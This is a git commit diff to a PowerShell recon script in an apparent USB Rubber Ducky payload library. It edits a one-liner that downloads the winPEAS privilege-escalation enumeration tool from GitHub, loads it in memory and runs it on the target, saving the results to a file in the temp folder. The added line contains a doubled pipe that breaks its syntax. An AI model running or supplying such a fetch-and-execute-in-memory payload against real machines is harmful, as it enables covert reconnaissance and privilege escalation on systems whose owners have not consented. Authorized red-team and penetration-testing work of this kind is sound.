d2f75238473c00654b95d64b9fb6bc78acf1bd12
FalsePhilosopher <joshgarland90@gmail.com>
2022-10-12 16:16:44 -0600

    winpeasupdate

--- Ducky/USBRubberducky/library/recon/Win/Winpeas/WPL.ps1
+++ Ducky/USBRubberducky/library/recon/Win/Winpeas/WPL.ps1
@@ -5,6 +5,6 @@ $FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_computer_recon.txt"
 $url = "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe"
 
 # One liner to download and execute winPEASany from memory in a PS shell
-$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("") >> $env:TMP\$FileName
+$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("") | | Out-File -Encoding ASCII $env:TMP\$FileName
 
 
